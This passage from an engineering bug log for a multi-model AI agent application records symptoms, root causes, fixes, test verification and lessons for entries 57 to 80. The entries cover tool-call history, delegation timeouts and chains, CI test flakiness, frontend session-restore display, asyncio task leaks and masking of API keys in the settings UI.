**Root cause:** In `modules/thinking/core/model_runner.py`'s tool loop, when constructing the **assistant message declaring tool_calls** (`messages.append(ChatMessage(role="assistant", content=None, tool_calls=all_result_calls))`), **this round's `reasoning_content` was not attached**. In thinking mode, once an assistant message generated reasoning, subsequent requests must return it verbatim (only `if m.reasoning_content: msg["reasoning_content"]=...` inside `_messages_to_api` sends it back). In history, that assistant message had reasoning_content None → not returned → next request 400s.

**Fix (around model_runner.py:1740):** When constructing the tool_calls assistant message, attach `reasoning_content=getattr(response.message, "reasoning_content", None)` — returned in thinking mode; None and harmless otherwise.

**Verification:** 314 model_runner / large_model_client related tests pass.

**Lesson:** For thinking-mode (Reasoner) multi-turn tool calls, **assistant messages must fully preserve and return `reasoning_content`** (just as important as `tool_call_id`/`tool_calls`) — no site constructing an assistant message may drop it, or cross-turn requests get rejected by the provider. Triage mantra for such 400s: does the history's assistant carry reasoning_content + does `_messages_to_api` send it back.

## 58. socket/subprocess tests falsely killed by the 20s timeout in CI full runs (testing/CI)

**Symptom:** CI full runs (5875 tests / 10 minutes) sporadically hit `test_screen_capture_daemon.py::test_bind_stale_retry` `Timeout (>20.0s)` plus the following test reporting `previous item was not torn down properly` (cascade); earlier, `test_runtime_expert_ext` also had similar Timeouts. Standalone/small-scope local runs all pass (test_bind_stale_retry call takes only 0.01s).

**Root cause:** `pytest.ini`'s `--timeout=20` is too tight for scheduling/import latency under **full-suite load** — the test itself is millisecond-level, but on CI machines grinding through 5875 tests over 10 minutes, resources are strained; pytest's start-to-finish span (setup/import/scheduling included) can exceed 20s → falsely killed by pytest-timeout; once killed, monkeypatch teardown never ran → the next test reports "not torn down properly".

**Fix:**
- `pytest.ini`: `--timeout=20` → `--timeout=60` (headroom for full load; the longest local unit test is ~21s, so 60s won't mask true deadlocks for long)
- `test_bind_stale_retry` / `test_run_exits_when_bind_none`: socket paths moved from the global `/tmp/x.sock` to `tmp_path` isolation (prevents conflicts with leftover real socket files under full runs)

**Verification:** screen_capture_daemon + runtime_expert, 67 tests pass.

**Lesson:** `pytest-timeout` thresholds must be set for the **worst case (CI full load)**, not local single-test timings — even millisecond tests time out under full-load scheduling/import delays. For "fast alone, killed in the full suite" cases, loosen the timeout first rather than reworking test logic.

## 59. delegate_task's wait_seconds parsed but never forwarded — supervisor-set subordinate timeout always falls back to 300s (backend)

**Symptom:** After the request to "let the upper-level large model set the subordinate's thinking timeout itself", the `delegate_task` tool marked `wait_seconds` as required, yet the runtime value set by the supervisor **never took effect** — the subordinate runner's think timeout stayed pinned at `DEFAULT_DELEGATE_THINK_TIMEOUT=300`.

**Root cause:** At `model_runner._generate_with_tools`'s delegate_calls dispatch, only `role`/`task` were parsed; **`args["wait_seconds"]` was never fed into `DelegationRequest`** (delegation_port.py:24 field stayed None); receiving None, `ProbeDelegationAdapter.delegate` took the fallback branch (warning only on absence). The tool schema declared "required + effective", but the chain snapped between parsing and consumption.

**Fix (commit `16bd27e`):** delegate_calls dispatch parses `wait_seconds` (clamped 1-600) → `DelegationRequest.wait_seconds` → probe_started `think_timeout` → `_handle_probe_started` → `start_runner(think_timeout)` → `runner.THINK_TIMEOUT` (overridden in delegation scenarios, default otherwise).

**Verification:** `test_delegate_think_timeout_passed` / `test_delegate_think_timeout_fallback`; 288+ related pass.

**Lesson:** "A tool parameter declared required" ≠ "the parameter truly takes effect" — **parse → forward → consume** must be tested as one connected flow. This pattern (schema declarations disconnected from actual forwarding) is a hotspot for same-class bugs; when triaging, search whether the parameter is genuinely used downstream of the parse site.

## 60. think_once's outer 120s nested timeout overrides the runner's THINK_TIMEOUT — the supervisor-set timeout gets swallowed (backend)

**Symptom:** Even after §59 fixed `wait_seconds` forwarding, the supervisor-assigned subordinate timeout (e.g., 300s) still had no effect — a single think always ended at 120s.

**Root cause:** Doubly nested `pausable_wait_for`: `think_once`'s outer `timeout=SINGLE_THINK_TIMEOUT=120` (continuous_thinker.py:32) wraps the entire `think_fn` (i.e., `runner._generate`), while inside the runner `timeout=self.THINK_TIMEOUT` (300). **The outer 120s elapses first → cancels the inner → the supervisor-set 300s is never reached**. Nested timeouts resolve to "the smaller one", not the outer's "ceiling".

**Fix:** `think_once` switched to `getattr(runner_ref, "THINK_TIMEOUT", None) or SINGLE_THINK_TIMEOUT` — the upper layer's timeout aligns with the runner's (delegation-supplied values truly take effect); the timeout-retry branch's log/error lines likewise use the dynamic `_timeout`.

**Verification:** 609 related pass.

**Lesson:** With layered `wait_for`/timeout wrappers, **an outer timeout smaller than the inner means the inner never fires** (effective timeout = smallest nested value). Whenever making timeouts configurable, audit every wrapping layer so none is smaller than the configured value.

## 61. Delegation chains unreconstructable + think context lost after timeout (backend)

**Symptoms (two related structural defects):**
1. **Delegation chains cannot be reconstructed**: `delegation_id` ≡ `task_id` (shared along the whole chain, hierarchy indistinguishable); `probe_id` is unique per delegation but lives only in the in-process `_probe_map`, never propagating with messages; the blackboard's `delegations` is never written by production code (`write_delegation` has no production callers); `_pending_delegations` keys by `task_id` and clears on every `continuous_think`, so multiple delegations overwrite each other.
2. **Thinking lost after timeout**: the tool loop's `messages` exist only in memory and vanish once timeout/interruption terminates; `_save_partial_result` saves only partial output **text** (history_thoughts + streaming), not a resumable messages checkpoint.

**Root cause:** Wrong unique-identifier choice for delegation tracking (task_id reused) + delegation-chain data never landed in storage; resumable snapshots never designed (timeout = retry from scratch).

**Fix (commit `16bd27e`):**
- `Delegation` extended into a chain node (`caller/return_to/parent_delegation_id/child_delegation_ids/origin_task_id/probe_id/target_model_id/progress/context_summary`); `delegation_id` uses the per-delegation-unique `probe_id`
- On `delegate_task` dispatch, `_record_delegation_chain` writes the blackboard and persists alongside it by `(session_id, blackboard_id)`; `probe_started` propagates `parent_delegation_id`/`origin_task_id`; `thinking_result` writes back status/result
- Each tool-loop round, `_save_resume_context` saves a messages checkpoint (runner + blackboard + persisted); on `think_once` timeout retries, `_request_resume` → the runner resumes thinking from the checkpoint (`_resume_context` rebuilds messages + a "continue from interruption" instruction)
- `ChatMessage/ToolCall` gain `to_dict/from_dict`; the blackboard gains `persist/load`

**Verification:** 7 delegation-chain blackboard tests + 3 resume-from-checkpoint tests + 938+ related pass.

**Lesson:** ① Chain tracking must use **per-instance unique IDs** (probe_id), never identifiers shared along the chain (task_id); ② "how to continue after a timeout" must be decided at design time (checkpoint snapshots), otherwise timeout = redo everything; ③ cross-model state like delegation must land in storage (persisted alongside the blackboard per session); in-process temporary tables cannot support cross-restart/cross-level queries.

## 62. thinking_result's two production paths disagree on delegation_id semantics — RuntimeExpert path uses task_id, blackboard delegation chain finds nothing (backend)

**Symptom:** After on-demand experts (RuntimeExpert, e.g., SecurityMonitor) completed, the supervisor's `query_delegation` couldn't find that delegation's result/status update — the delegation chain stayed stuck at "delegated".

**Root cause:** After §61's fix, the thinking_result sent by `continuous_thinker._notify_return_target` uses `delegation_id = runner._delegation_id` (**probe_id**, the blackboard delegation-chain key); but `model_runner._run_runtime_expert`'s wakeup path (around model_runner.py:367) still wrote `"delegation_id": self._task_id` (**task_id**). Two production paths emitting the same message field with different semantics → the supervisor's `_wait_for_wakeup_event` wrote back keyed by delegation_id and blackboard `get_delegation()` could never match (task_id isn't the blackboard key) → RuntimeExpert delegation status/results never landed on the blackboard.

**Fix:** `_run_runtime_expert`'s wakeup message changed to `"delegation_id": self._delegation_id or self._task_id` (preferring probe_id), plus `"task_id": self._task_id` (so the supervisor's `_pending_delegations` can match by task_id). Aligned with the `_notify_return_target` path.

**Verification:** `test_runtime_expert_thinking_result_uses_probe_id` (asserts delegation_id=probe_id and task_id present); 145+ related pass.

**Lesson:** When one message field has **multiple production paths**, its semantics must be uniform — fixing one site mandates a repo-wide sweep of every sender (grep `action: thinking_result` / `"delegation_id"`), otherwise some paths (RuntimeExpert here) fail silently, with no error raised — surfacing only as "can't find it" at query_delegation time.

## 63. start_runner's delegation-node record overwrites delegate dispatch's record — delegation role name replaced by identity.role (backend)

**Symptom:** End-to-end testing revealed that at `delegate_task` dispatch, `_record_delegation_chain` recorded the delegation under the **role display name** (e.g., "代码实现专家"); subsequently the manager consuming probe_started → `start_runner` **overwrote that same probe_id's delegation node** with `identity.role` (e.g., `code_writer`) → the role in the delegation chain became the English identifier and `query_delegation` lost the display name.

**Root cause:** A single delegation node had two recording sites (delegate dispatch + probe activation); the latter's `write_delegation` unconditionally clobbered the former (both keyed by the same probe_id).

**Fix:** Before recording the delegation node, `start_runner` checks whether `bb.delegations` already contains that probe_id — if present, it only fills in `target_model_id` (via `update_delegation_progress`) without touching role/task/caller; `write_delegation` applies only to genuinely missing cases like orchestrator direct starts.

**Verification:** `tests/integration/test_thinking_e2e.py::test_delegation_chain_full_flow` asserts the delegation chain `role=代码实现专家, caller=large_primary_001, parent=probe_user_input, status=replied`; 79+ related pass.

**Lesson:** When one business entity (a delegation node) has two writers, "who wins / who supplements" must be spelled out, or the later writer silently clobbers the earlier one.

## 64. The resume-thinking "continue from interruption" instruction accumulates across repeated timeout retries (backend)

**Symptom:** End-to-end review found that on `think_once` timeout retries (MAX_THINK_RETRIES), every resume appended a "continue from interruption" system instruction to messages; once the checkpoint refreshed, another resume inserted another copy → context bloat + duplicated instructions.

**Root cause:** The resume branch performed an unconditional `messages.append(...)`, never checking whether the checkpoint already contained the instruction.

**Fix:** The resume branch first scans the checkpoint messages for the existing marker (`has_resume_marker`) and skips insertion when present.

**Verification:** 503+ related pass.

**Lesson:** Idempotency — before injecting a marker instruction, any "checkpoint restore/resume" logic must check whether it's already been injected; repeatedly resuming the same checkpoint must not append repeatedly.

## 65. Blackboard final_response set but never persisted — final reply lost after restart (backend)

**Symptom:** While verifying blackboard snapshots end to end, discovered that `blackboard.persist()` was invoked only during checkpoint saving/delegation-chain recording; `final_response` as terminal state, once set via `set_final_response`, was never persisted → the DB snapshot's `final_response` stayed None forever.

**Root cause:** Persistence-timing coverage gap — only "process states" (checkpoints/delegations) covered; "terminal states" (the final reply) omitted.

**Fix:** `CognitiveBlackboard.set_final_response` calls `self.persist()` at the end (failures non-blocking), guaranteeing the final reply lands in the DB and remains recoverable.

**Verification:** `test_delegation_chain_full_flow` asserts `state["final_response"] == blackboard.final_response`; 503+ related pass.

**Lesson:** Blackboard persistence must cover "terminal-state" fields (final_response etc.), not merely process states; methods writing terminal state should themselves trigger persistence.

## 66. Test directly tampers with the global singleton ToolRegistry._tools — 69 failures in full CI runs (test pollution)

**Symptom:** Full CI runs produced 69 failures: `toolgate`/`tool_visibility`/`tools_search`/`tool_registry_ext` reporting `'_T' object has no attribute 'risk_level/category/enabled/...'`, while single-file local runs all passed.

**Root cause:** My new `test_tool_permission_ext.py::test_get_base_whitelist_star`, in order to test `*`-expansion logic, directly executed `tr.ToolRegistry._tools = {_T objects missing fields}`, **tampering with the globally shared singleton**. Under full runs, `test_toolgate` et al. read `ToolRegistry._tools` and got the leftover `_T` objects (missing risk_level/category etc.) → AttributeError. Single-file runs passed because the `_T` pollution only surfaced when other tests read it under **cross-file execution order**.

**Fix:**
1. Isolated via `monkeypatch.setattr(ToolRegistry, "_tools", {...})` — pytest monkeypatch auto-restores at **teardown**, pollutes nothing global, and doesn't depend on really-registered tools.
2. (Related) the `read_context` tool had been wrongly added to every tier's base tools, breaking `test_get_control_tools_expert` → moved back into the large/supervisor delegation group.

**Verification:** CI-scale full `tests/unit` 6036 passed (from 69 failed → 0).

**Lesson:** ① Tests must **never assign directly to a global shared singleton's internal state** (`ToolRegistry._tools`, `_runner_managers`, `_session_memory_context`, etc.) — isolate with `monkeypatch.setattr` (auto-restore) or real APIs + cleanup; ② single-file green ≠ test-safe; pollution exposed only by full-run cross-file ordering demands full-run regression; ③ mock objects missing fields (`_T`) are a classic signal of "reading tampered global state".

## 67. New control tool read_context wrongly added to all tiers — expert privilege overreach (backend/testing)

**Symptom:** `test_get_control_tools_expert` failed: expert's control tools gained `read_context`.

**Root cause:** Inside `tool_permission_controller.get_control_tools`, `READ_CONTEXT_TOOL` had been put into the base tools list `tools = [CONTINUE_THINKING_TOOL, QUERY_TOOL_DETAILS_TOOL, READ_CONTEXT_TOOL]` — **shared across all tiers**. But `read_context` reads blackboard memories/delegation context; expert has no memory-reading needs and shouldn't see it.

**Fix:** Moved `READ_CONTEXT_TOOL` into the `if delegation_available and tier in ("large", "supervisor")` delegation group (peer to query/resume_delegation).

**Verification:** `test_get_control_tools_expert` restored; 144 tool-related passed.

**Lesson:** New control tools must be **explicitly classified** by tier permissions (base/delegation/large-model-only), never mindlessly stuffed into the shared base list; expert exposes only the minimal necessary tools.

## 68. Todo panel's 3-second polling → WS event push + pull-on-demand (frontend/backend)

**Symptom:** The frontend todo panel polled via `setInterval(loadTodos, 3000)`, so after the model updated todos, display lagged by up to 3 seconds; and the polling fired a request every 3 seconds, continuously consuming resources even for idle sessions.

**Root cause:** The todo tool (invoked by the model) executes via MCP in `model_runner._generate_with_tools`, leaving the frontend oblivious — it could only pull via polling; the architecture was "pull" rather than "push".

**Fix (architecture change: polling → push + on-demand fetch):**
- Backend: `model_runner` gains `_push_todo_update()`; after successful todo-tool execution it pushes a `type='todo', event='todo_changed'` WS event (with session_id) via `connection_manager.send_json_from_thread`
- Frontend: `Chat.vue` registers `wsClient.on('todo', _onTodo)` (onMounted) → upon receiving the event, calls `loadTodos()` **on demand**; removed the 3-second `setInterval` polling; `_onTodo` filters by session_id (pushes from other sessions don't refresh the current view)

**Persistence (unchanged, already sound):** Todo tool invocations write `~/.cortex/todos/{session_id}.json` (`_save_todos`) immediately, isolated per session; nothing lost when switching sessions.

**Verification:** Backend `test_push_todo_update` + `test_todo_tool_execution_triggers_push`; frontend `_onTodo` two cases (triggers refresh / other sessions ignored); frontend 497 + all related backend pass.

**Lesson:** ① Frontend "real-time state" should prefer **event push** over timed polling — where a WS channel exists, push + pull-on-demand avoids wasteful polling; ② pushed events must carry `session_id` and be filtered per session on the frontend, otherwise multi-session cross-talk; ③ for persisted state like todos, writing to disk upon model tool invocation is the correct paradigm — no extra synchronization needed.

## 69. Frontend context-usage display reads low — context_tokens excludes tool-call history (backend)

**Symptom:** ThinkingStatusPanel showed a context-usage percentage lower than reality, mismatching actual consumption.

**Root cause:** `model_runner._generate_with_tools` estimated only once **before entering the tool loop**: `_thinker._context_tokens = engine.estimate_tokens(system + tools + user_prompt)` (model_runner.py:2023); messages accumulated each round inside the tool loop (tool_calls + tool results) were never counted. Meanwhile `_maybe_summarize_context` internally computed messages tokens (for the 90% summarize threshold) but never synced back into `_context_tokens` → the frontend displayed initial-prompt usage, not live accumulation.

**Fix:** Each round, `_maybe_summarize_context` syncs the messages-derived token estimate back into `self._thinker._context_tokens` (regardless of whether summarization triggers), so the frontend displays real usage including tool history.

**Verification:** `test_maybe_summarize_syncs_context_tokens`; frontend ThinkingStatusPanel context warn(70%)/danger(90%)/100%-cap/hidden-when-no-data tests.

**Lesson:** ① A "one-time estimate" used to display cumulative state must cover the full accumulation range (tool history included), else the displayed value distorts; ② token-estimation update points must align with "real consumption points" (where messages grow), not be computed only once at initialization; ③ frontend-displayed fields (context_tokens) need a backend-maintained **authoritative live value**; the frontend merely renders.

## 70. Model call failure: 'NoneType' object is not iterable —— SSE stream delta.tool_calls is null (backend)

**Symptom:** During the tool loop the model call reported `[模型调用失败: 'NoneType' object is not iterable]`, interrupting thinking.

**Root cause:** `large_model_client._parse_openai_stream` iterated tool-call deltas via `for tc_delta in delta.get("tool_calls", [])`. When DeepSeek reasoning mode streams, **during the thinking phase the `delta.tool_calls` field exists but holds `null`** — `dict.get(key, [])` returns **None** when the key exists but its value is None (not the default `[]`), so `for ... in None` → `'NoneType' object is not iterable`.

**Fix:** `for tc_delta in (delta.get("tool_calls") or [])` — using `or []` guards both "key missing" and "value is null".

**Verification:** Added `test_openai_stream_tool_calls_null_safe` (tool_calls:null interleaved with text + subsequent tool calls) + `test_openai_stream_tool_calls_key_missing`; large_model_stream 9 passed + 274 related passed.

**Lesson:** ① `dict.get(key, default)` returns the default only when the **key is missing**; when the **key exists but the value is None**, it returns None — for nullable fields use `get(key) or default`; ② SSE stream parsing must tolerate provider field emptiness (null/absent); DeepSeek reasoning's tool_calls being null during the thinking phase is normal; ③ when triaging "X is not iterable", search for `for x in dict.get(...)` patterns first.

## 71. Extra standalone "Thinking" bubbles appear after switching sessions (frontend)

**Symptom:** After switching back to a session, several "Thinking/Thinking/Thinking" boxes that hadn't shown live popped up (repeated `kind: 'thinking'` bubbles).

**Root cause:** Session-switch restore (loadHistory) and runtime thinking display were **two paths with inconsistent behavior**:
- **Runtime**: large-model thinking accumulates into `pendingThinking` and finally folds into the reply box (`consumeThinking`), **never becoming standalone messages**
- **Restore**: persisted `role='thought'` messages were rendered one by one as standalone `kind: 'thinking'` bubbles (with "Thinking" badges); multiple think rounds → multiple "Thinking" boxes

The backend persists every round of continuous thinking as `role='thought'`; at restore they all became standalone bubbles, visually diverging badly from runtime.

**Fix (loadHistory):** Large-model (non-supervisor/expert) thoughts now **accumulate into `pendingLargeThinking` and aggregate into the `_thinking` area of the immediately following assistant/large reply** (consistent with runtime folding); accumulated thoughts lacking a following reply are discarded. Tool calls still enter traces; supervisor/expert still aggregate into standalone expert bubbles (unchanged).

**Verification:** Updated original tests (large-model thought no longer becomes standalone thinking bubbles) + added a "thought aggregates into the reply's thinking area rather than a standalone bubble" case; frontend 498 all pass.

**§71 addendum (similar-bug sweep found an attribute-name mismatch):** §71's initial fix wrote restored thinking into `msg._thinking`, but the component's normal-message branch reads `message.thinking` (`ChatMessage.vue:209/211`) — restored thinking remained invisible (store tests asserted `_thinking`, component tests asserted `thinking`; each passed without covering the other). Fixed to write `msg.thinking` (consistent with runtime `Chat.vue:191`).

**Lesson:** ① A given state's **runtime display path and restore path must be identical** — restore (loadHistory) should reuse the runtime's aggregation logic (pendingThinking folding), not author another renderer; ② a persisted "thinking step" ≠ one "message"; at restore, aggregate per the runtime's grouping rules, otherwise the post-switch UI diverges from live; ③ fixing such issues requires also updating tests that "assert the old behavior", otherwise tests keep cementing the wrong presentation.

## 72. Runtime vs restore path inconsistency (similar-issue sweep) — expert bubble count / thinking-area attribute name (frontend)

**Symptom:** While sweeping §71-class bugs (runtime display path vs session restore path inconsistencies), found two:

1. **Expert bubble count inconsistent (HIGH)**: runtime `addExpertMessage` created **a new bubble for every supervisor/expert event** (no same-tier dedup) → one work round produced many bubbles; loadHistory restored them aggregated into one → expert bubble count/content differed after switching sessions.
2. **§71 attribute-name mismatch (HIGH)**: restore wrote `msg._thinking`, while the component's normal-message branch read `message.thinking` → restored large-model thinking invisible (store and component tests each asserted their own attribute, covering neither the other).

**Root cause:** Runtime and restore each maintained their own logic; attribute names/aggregation rules unaligned.

**Fix:**
- `addExpertMessage` reuses existing bubbles within the same tier (`_expertBubbles` map): updates content + merges thinking/tools, consistent with restore's "aggregate into one"
- Restored large-model thinking now written to `msg.thinking` (consistent with runtime `addMessage({thinking})`)

**Verification:** Added "same-tier reuse" and "different-tier independent" cases; frontend 500 all pass.

**Lesson:** ① Runtime and restore **must share one set of display rules** (attribute names, aggregation strategy), otherwise the post-switch UI diverges from live while tests fail to expose it; ② two test files (store/component) asserting `_thinking` and `thinking` respectively precisely masked the attribute-name breakage — cross-layer tests must verify "store-written field = component-read field"; ③ similar-bug sweeps should methodically compare "runtime event handling" against "loadHistory restore mapping" for mismatches in attribute names/count/content.

## 73. Restore-path tool traces double-counted + approval text polluting the thinking area (frontend/backend, §71 class)

**Symptom:** Two MED issues surfaced while sweeping §71-class bugs (runtime vs restore inconsistency):

1. **Tool traces double-counted**: supervisor/expert tool traces at restore entered both the expert bubble `_tools` (via expertAgg pre-scan) and the global `traces`; at runtime they entered only expert `_tools` (`addExpertTool`). → duplicated trajectory entries after restore.
2. **Approval/question text polluting the thinking area**: security events ("等待用户审批"/"user_intent_request") persisted as `role='thought', tier='thinking'`, folded at restore into the large-model reply's thinking area — transient interaction text became historical "thinking" content, misleading.

**Fix:**
- MED-1: At restore, supervisor/expert tool traces go only into expert `_tools` (global `traces` receives only `tier!=='supervisor'&&tier!=='expert'`)
- MED-2: Backend `_persist_thought` persists `event_type=='security'` with `tier='security'`; frontend skips `tier==='security'` thoughts at restore (neither folded into the thinking area nor turned into historical bubbles)

**Verification:** Added "expert tool traces not duplicated into global traces" + "security tier skipped" cases; frontend 501 + backend api_stream 180 all pass.

**Lesson:** ① Multi-path accounting of the same data at restore (expert aggregation + global traces) needs dedup protection; whichever path runtime uses, restore must mirror; ② transient interaction events (approvals/questions) must not be persisted/displayed as historical "thinking" — either don't persist them, or tag them with a dedicated tier and skip at restore; ③ cross-stack fixes must ship together (backend persistence tier tagging + frontend recognition).

## 74. Architectural root cure: runtime and restore share one classification rule (frontend refactor)

**Background:** §71-73 successively exposed runtime-vs-loadHistory inconsistencies (thinking folding / expert bubble count / attribute names / doubled tool traces / approval pollution), each fixed patch-style ("fix runtime in one place, restore in another"). Root cause: two independent implementations whose attribute names/aggregation rules were never aligned.

**Architectural refactor (root cure):**
- **New pure function `classifyThinking(d)`**: unified classification rules (security skip / approval / intent / tool_trace / expert / thinking), **shared by** runtime WS events and loadHistory restore — a single source of classification truth, eliminating inconsistency at the root
- **New `dispatchThinking(d)`**: runtime WS-event dispatcher (calls classifyThinking, then executes addApproval/addIntent/addExpertThinking/addExpertMessage/addThinkingStep/traces per category)
- **Chat.vue `_onThinking`** changed to call `chat.dispatchThinking(d)` (runtime now flows through the unified classification too)
- **loadHistory** now uses `classifyThinking` to classify persisted messages and accumulate by category (expert aggregation / large-model thinking folding / tool trajectories / security skip) — no separately maintained mapping logic anymore

**Verification:** Added architecture-consistency tests (classifyThinking classification rules + dispatchThinking output/routing split + tool-trace categorization); frontend 504 all pass.

**Lesson:** ① Display rules ("which data → which UI") should be extracted into a **single pure function** invoked by both runtime and restore, not implemented twice — classification then always agrees, and attribute names/aggregation strategies unify naturally; ② restore is not "write another renderer" but "replay/accumulate persisted data under the same rules"; ③ architectural cures beat repeated patches — patches fix today's inconsistency point, while architectural unification eliminates entire bug classes at the source.

## 75. AI ordered-list output overflows the bubble boundary (frontend styling)

**Symptom:** When AI output contained numbered content (markdown ordered lists `1. 2. 3.`), the numbers/long content overflowed past the bubble boundary, bursting `message-bubble`.

**Root cause:** `.message-bubble` (`frontend/css/components.css`) had `max-width: 100%` but **lacked `min-width: 0` and `overflow-wrap: break-word`/`word-break: break-word`**. As a child of the flex container `.message-body`, flex items default to `min-width: auto`, blocking shrinkage; encountering unwrappable long tokens (numbered lists), content overflowed the bubble.

**Fix:**
- `.message-bubble` gains `min-width: 0; overflow-wrap: break-word; word-break: break-word;`
- Added `.message-bubble ol/ul/li` wrapping protections (`overflow-wrap`/`word-break`) + list indentation styles (`list-style: decimal/disc`)

**Verification:** ChatMessage 21 tests + frontend build pass.

**Lesson:** Bubble children inside flex layouts need explicit `min-width: 0` to permit shrink-and-wrap; long content (numbered lists/URLs/code identifiers) relies on `overflow-wrap: break-word` as the safety net, otherwise it bursts fixed max-width containers. CSS overflow problems are routinely missed by "logic-only, no-styling" tests — verify manually under realistic-width rendering.

## 76. After long idle periods: "Task was destroyed but it is pending!" (leftover asyncio Event.wait, backend)

**Symptom:** After hours idle, logs filled with:
```
Asyncio error without exception: {'message': 'Task was destroyed but it is pending!',
  'task': <Task pending ... coro=<Event.wait() running at locks.py:213> wait_for=<Future pending cb=[Task.task_wakeup()]>>}
```
Task numbers (Task-3838/4022/4214/4386/4572/4755...) increased with each conversation — i.e., **every conversation** left behind one dangling `Event.wait()` task, which errored when the event loop shut down and destroyed it.

**Root cause:** `modules/thinking/multi_model_orchestrator.py` awaited the large-model completion signal via
`asyncio.wait_for(asyncio.shield(done_event.wait()), timeout=POLL_INTERVAL)`.
`asyncio.shield` creates a **separate internal task** wrapping `done_event.wait()`; when the outer `wait_for` times out and cancels, **the shield blocks cancellation from propagating into the internal task**, so the internal `Event.wait()` stays hanging. Every conversation left one such pending task; over long idle they accumulated massively, and shutting down the loop triggered "Task was destroyed but it is pending!".

**Fix:** Dropped `asyncio.shield`, calling `asyncio.wait_for(done_event.wait(), timeout=POLL_INTERVAL)` directly.
`done_event.wait()` merely awaits a signal; on timeout the next loop iteration simply re-awaits (returning instantly once `done_event` is set) — no shield protection needed.
(The shields at `model_runner.py:211/3270` await long-running background tasks finishing gracefully at shutdown — a legitimate use, left unchanged.)

**Verification:** `test_multi_model_orchestrator_ext.py::test_wait_large_no_shield_task_leak` (no leftover pending Event.wait task after a wait_for timeout) + `test_wait_large_done_event_set_returns`; 213 orchestrator-related tests pass.

**Lesson:** `asyncio.shield` means "defer cancellation", not "prevent cancellation" — a shielded internal task can still be pending when the event loop closes. For an `Event.wait()` needing only "await signal, retry on timeout", plain `wait_for` suffices; reserve shields for long-running tasks that genuinely require lifecycle decoupling from the caller.

## 77. Redundant manual API-Key input on the authorization settings page (frontend, security-exposure anti-pattern)

**Symptom:** The "Authorization Settings" tab had a manual "API Key" input box (`X-API-Key`, governed by backend `SIMPLE_API_KEY`) able to save/clear the key.

**Root cause:** Redundant design. On startup the frontend's `autoDetectApiKey()` already auto-fetches the key from `/config/api-key` (dev/test return plaintext directly; production returns plaintext only to loopback clients, everyone else just gets a `configured` status). The manual input mattered only for the edge case "production + non-loopback client" and was useless everywhere else; worse, it exposed a security credential as a frontend entry point — a security anti-pattern.

**Fix:** Removed the authorization tab's API-key input section (`keyInput`/`saveKey`/`clearKey`), keeping the `autoDetectApiKey`/header-carrying logic. The authorization settings tab retains only the runtime config table.

**Verification:** Settings.spec.js dropped 3 tests dependent on that UI and rewrote 1 tab test; 50 frontend tests pass; after rerunning `npm run build`, dist contains no `key-input`/`输入 X-API-Key` residue.

**Lesson:** Any configuration already covered by "auto-detect/auto-recovery" should not keep a manual frontend entry — it is both redundant and an enlarged attack surface. Same-class checks: see §78, §79.

## 78. Authorization settings tab's runtime config table displays model API Keys in plaintext (frontend, §77 class)

**Symptom:** The authorization tab's "Runtime Configuration" table rendered every modifiable entry of `configStore.config` line by line via `String(v)`, including plaintext secrets such as `LARGE_MODEL_API_KEY`/`MEDIUM_MODEL_API_KEY`/`SMALL_MODEL_API_KEY`/`PERCEPTION_VOICE_API_KEY`/`OUTPUT_TTS_API_KEY`/`VISION_API_KEY`.

**Root cause:** `get_config` (api/main.py:764) returns all keys within `_MODIFIABLE_CONFIG_KEYS` (model/voice/vision secrets included), and the frontend runtime table prints every non-object value as plaintext via `String(v)`. These secrets each have dedicated password-style config sections (main model config etc.), so displaying them in a running table is redundant exposure (shoulder-surfing/log-leak risk).

**Status:** Confirmed same-class issue; fix pending (frontend will mask secret fields as `••••`, editing via password inputs).

**Lesson:** The allowed-to-display config list (`_MODIFIABLE_FIELDS`) itself contains secret fields; any "full-config render" surface must mask secret values by field name (KEY/TOKEN/SECRET/PASSWORD patterns).

## 79. Delegation role-name resolution hardcoded (delegation_port ROLE_TO_IDENTITY, backend, §77-class hazard)

**Symptom:** `modules/thinking/core/delegation_port.py:135`'s `ROLE_TO_IDENTITY` is a **hardcoded** role-name → (tier, identity_key) mapping table. When new supervisor/expert roles are added (including orchestration-page custom agents) without updating this table, `delegate_task` reports `未知委托角色`.

**Root cause:** The prompt side's role list is **dynamic** (`composer._build_supervisor_table()/_build_expert_table()` read all tier=supervisor/expert roles from roles.yaml live, injecting them into the commander/supervisor prompts; `identity.get_identities()` also merges orchestration-page custom agents), but delegation execution's `_resolve_role` could only resolve the hardcoded mapping table. Dynamic listing vs hardcoded parsing disagree → new roles show up as delegable in the UI yet cannot actually be delegated. Empirically verified: `security_supervisor`, `data_expert` → `_resolve_role` returned `None`.

**Additional hazard:** `_build_supervisor_table/_build_expert_table` read only `roles.yaml`, excluding orchestration-page custom agents (merged into identities but absent from the delegation guidance list).

**Fix:**
1. `_resolve_role` gains a dynamic fallback: on `ROLE_TO_IDENTITY` miss, consult `get_identities()` (including orchestration-page custom agents, direct/substring match) — newly added roles become delegable without touching the mapping table.
2. `_build_supervisor_table/_build_expert_table` switched to merge custom agents (composer `_merged_roles`, built on the injection loader + `settings.get_custom_agents()`).
3. **Delegable-role tables injected into the system prompt according to model permissions**, no longer via the blackboard:
   - Removed `multi_model_orchestrator.py`'s blackboard-written `delegation_guidance` (available-supervisors/available-experts tables)
   - `_build_capability_table`: large → supervisor table + expert table; supervisor → expert table; expert → none
   - Deleted `continuous_thinker._build_expert_context_section`'s **hardcoded role table** (stale names `test_writer`/`data_analyzer`/`memory_manager`/`emotion`, inconsistent with roles.yaml and missing `ui_designer`/`customer`)
   - `delegate_task` tool role description updated to "delegable supervisors"/"delegable experts"

**Verification:** delegation_port gains 2 dynamic-fallback tests; composer gains custom-agent merge tests; `test_build_expert_context_only_large` rewritten as `test_expert_context_moved_to_system_prompt` (large: supervisor+expert tables / supervisor: expert table / expert: none); 180 related tests + 89 orchestrator tests pass.

**Lesson:** Capabilities dynamically enumerated in prompts must originate from the same source the executor resolves against, otherwise you get disconnects visible in UI/prompts yet failing at runtime. Delegable-role tables are "model permission" information and should ride the system prompt per tier, not broadcast globally via the blackboard (avoiding duplicate injection + unauthorized visibility); hardcoded role names decay as roles.yaml evolves.

## 80. "Thinking Ns" timer counts from session connection, not the current task (backend api_stream)

**Symptom:** The frontend "Thinking Xs" counter (`ThinkingStatusPanel`/`ThinkingIndicator`) ran persistently high; asking consecutive questions within the same session, the next round's seconds accumulated from the previous round instead of reflecting the current round's true elapsed time.

**Root cause:** In `modules/thinking/api_stream.py`, `started_at` is set only once at `start(session_id)` (WS connection established / session created); every user-message round runs `think()`, which never resets `started_at`. The WS `status` message's `elapsed_s = int(now - started_at)` therefore counts from "session connection moment" rather than "this round's think start".

